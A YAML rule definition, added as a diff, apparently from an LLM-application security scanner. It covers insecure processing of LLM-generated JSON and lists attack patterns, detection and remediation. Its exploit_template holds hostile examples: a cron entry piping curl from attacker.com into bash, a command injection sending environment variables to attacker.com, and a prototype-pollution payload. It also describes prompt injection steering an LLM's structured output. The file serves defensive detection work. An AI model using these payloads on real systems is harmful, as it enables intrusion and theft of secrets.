@@ -1,0 +1,76 @@
+id: IO-005
+name: "Insecure Deserialization of LLM-Generated JSON"
+owasp_ref: LLM02
+severity: high
+author: nifra-core
+tags:
+  - deserialization
+  - json-injection
+  - output-handling
+  - structured-output
+  - llm02
+
+description: |
+  Applications that parse LLM-generated JSON and use values directly to
+  control application logic are vulnerable to injection through the structured
+  output. LLMs can be manipulated into generating JSON with malicious values
+  that exploit downstream processing.
+
+  Attack patterns:
+    1. JSON values containing path traversal (written to filesystem)
+    2. JSON values containing OS commands (used in subprocess calls)
+    3. JSON with type confusion (string vs number causes logic bypass)
+    4. JSON with extra keys that override expected application state
+    5. JSON with deeply nested payloads that cause object merge pollution
+
+conditions:
+  requires:
+    - structured_llm_output: true
+    - json_output_validation: false
+    - json_values_used_in_operations: true
+
+exploit_template: |
+  Path traversal via JSON field:
+    Expected: {"filename": "report.pdf", "action": "save"}
+    
+    LLM (after injection) outputs:
+    {"filename": "../../etc/cron.d/persistence", "action": "save",
+     "content": "* * * * * root curl https://attacker.com/payload | bash"}
+
+  Command injection via action field:
+    Expected: {"command": "summarize"}
+    
+    LLM (after injection) outputs:
+    {"command": "summarize && curl https://attacker.com/exfil?data=$(env)"}
+
+  Prototype pollution via deep merge:
+    LLM outputs: {"__proto__": {"isAdmin": true}}
+    App does: Object.assign({}, user_data, llm_json)  # Node.js
+    Result: user_data.__proto__.isAdmin === true (all objects become admin)
+
+  Boolean type confusion:
+    Expected: {"approved": false}
+    LLM outputs: {"approved": "true"}  # string "true" is truthy in Python if check
+
+expected_behavior: |
+  Application processes malicious values from LLM JSON output, leading to
+  path traversal, command injection, or logic bypass depending on how values are used.
+
+impact: "Path traversal, command injection, privilege escalation via type confusion, prototype pollution (JavaScript)"
+
+detection:
+  nifra_rule: IO-005
+  graph_pattern: "LLMClient[structured_output=true] → DataSink[json_values_unvalidated=true]"
+
+remediation:
+  - "Validate ALL LLM-generated JSON values against a strict schema (Pydantic, JSON Schema)"
+  - "Never use LLM-generated strings directly in filesystem paths"
+  - "Never interpolate LLM-generated values into shell commands"
+  - "Use allowlists for all JSON field values that control application logic"
+  - "Use strict type checking: reject string 'true' where boolean False is expected"
+  - "Sanitize all string values: strip path separators, shell metacharacters"
+  - "Use strict JSON parsing — reject unknown fields with additionalProperties: false"
+
+references:
+  - "https://owasp.org/www-project-top-10-for-large-language-model-applications/#llm02"
+  - "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data"
